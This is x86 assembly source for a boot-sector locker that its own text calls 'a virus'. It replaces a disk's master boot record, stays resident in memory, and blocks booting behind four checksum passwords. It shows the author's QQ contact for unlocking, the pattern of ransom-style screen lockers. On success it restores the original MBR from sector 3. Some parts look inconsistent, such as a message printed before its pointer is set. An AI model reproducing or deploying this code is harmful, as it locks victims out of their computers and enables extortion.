;=================================================================
;这个代码先占个位，新锁芯还在开发中。
CPU 486
BITS 16
        xor ebx,ebx
        mov ds,bx
      mov ax,[0x413]           ;40:13,BIOS数据区保存常规的内存大小,单位:KBs.
      and al,0xfc        ;要求分配的物理内存地址,以页作为基地址
        sub ax,4
        mov [0x413],ax           ;开辟一段内存，实现程序的驻留
        shl ax,0x6               ;bx *= 1024 / 16 (KBs->线性地址=KBs*1024,段:除以16)
        mov es,ax                ;存储段地址

        mov si,0x7c00            ;拷贝代码到驻留内存中执行
        xor di,di                ;偏移地址为0
      mov cx,0x100             ;拷贝512
        rep movsw

      mov ax,0x201
        mov cl,0x2
        cdq                       ;Convert Double to Quad (386+)把edx扩展为eax的高位，也就是说变为64位。

        push es
      push word password         
        retf                     
;=====================================================================     
password:  
    ;第一层密码   
        MOV SI,ShowAuthorMessage
     CALL SHOWMESSAGE
     mov si,ShowEnterFMessage 
     CALL SHOWMESSAGE
     CALL GETKEY
     cmp cx,PassWordLength
	 jne password
     je again
again:                       ;第二层密码
     mov si,ShowEnterSMessage
     CALL SHOWMESSAGE
     CALL GETKEY
     cmp cx,Passwordsecond
	 jne password
     je lasttime
lasttime:                     ;第三层
     mov si,ShowEnterTMessage
     call SHOWMESSAGE
     CALL GETKEY
     cmp cx,PassWordthird
	 jne password
     je nextlasttime 
nextlasttime:                     ;第四层
     mov si,ShowEnterLast 
     call SHOWMESSAGE
     CALL GETKEY
     cmp cx,PassWordlast 
     je bootloader
wrong:                       ;第四层错了的话
     mov si,ShowByeBye
	   CALL SHOWMESSAGE
     jmp $
bootloader:                      ;校验密码成功，开始登陆
 CALL SHOWMESSAGE
 mov si,ShowWelcome 
   xor ax,ax ;初始化
	mov ax,0x7e00
	mov es,ax
	xor bx,bx
	mov ah,0x2
	mov dl,0x80
	mov al,1  ;数量
	mov dh,0  ;磁头
	mov ch,0  ;柱面  ；CHS寻址方式
	mov cl,3  ;扇区  ；
	int 0x13
	;写回去
	xor bx,bx
	mov dl,0x80
	mov ah,0x3
	mov al,1  ;数量
	mov dh,0  ;磁头
	mov ch,0  ;柱面
	mov cl,1  ;MBR扇区
	int 0x13
	jmp reset;重启计算机
;======================================================================
SHOWMESSAGE:    
      mov ah,0Eh             ; 功能 0Eh: 输出             
	 mov bx, 000ch                      
     cs lodsb                                                  ; 加载第一个字符
Next_Char:
     int 10h
     cs lodsb                                        ; al = 下个字符
     or al,al                                        ; 是否为最后一个
     jnz Next_Char                                   ; 如果是则不打印下一个字符
RETURNBACK:
     ret
;===========================================================
GETKEY:
     XOR CX,CX
LOOP:
     MOV AH,0
     INT 16H
     mov bl,al
     AND BX,0xFF
     CMP AL,0DH                                  ;判断是否Enter键
     JZ RETURNBACK
     ADD CX,bx                                   ;存入CX中
     MOV AL,24H
     MOV BX,07H                        
     MOV AH,0EH
     INT 10H                                      ;显示$号，继续等待输入
     JMP LOOP
;======================================================
GETENTER:                                           ;判断是否Enter键，如果是则返回，若不是继续等待输入
     MOV AH,0
     INT 16H
     AND AX,0xFF
     CMP AL,0DH
     JNZ GETENTER
     RET
;=======================================================
reset: 
mov ax, 0ffffh           ; 重新启动计算机，让程序跳转到 FFFF:0 单元处执行
       push ax             
       mov ax, 0
       push ax
       retf
;======================================================================
ShowAuthorMessage db   10, 13, "This virus by yeluoQQ393925220", 0
ShowEnterFMessage db   10, 13, "Enter first PassWord QAQ", 0
ShowEnterSMessage db   10, 13, "Enter second password awa", 0
ShowEnterTMessage db   10, 13, "Enter the third password qwq ", 0
ShowEnterLast     db   10, 13, "Enter the last password @_@ ", 0
PassWordLength    EQU 0XCEF ;“叶落当归根，云沉久必起.
Passwordsecond    EQU 0X1682 ;”唧唧复唧唧，木兰当户织，不闻机杼声，惟闻女叹息。
PassWordthird     EQU 0XAC4 ; yeluo520yeluo4588fanchenyeluo
PassWordlast      EQU 0X41 ;  
ShowByeBye        db   10, 13, "jiesuo+QQ393925220 steal my lock sima", 0
ShowWelcome     db   10, 13, "The password is correct!，Thanks！", 0
;=================================================================
times 510-($-$$) db 0X0                    ;填充00h
Boot_Signature            dw 0AA55h
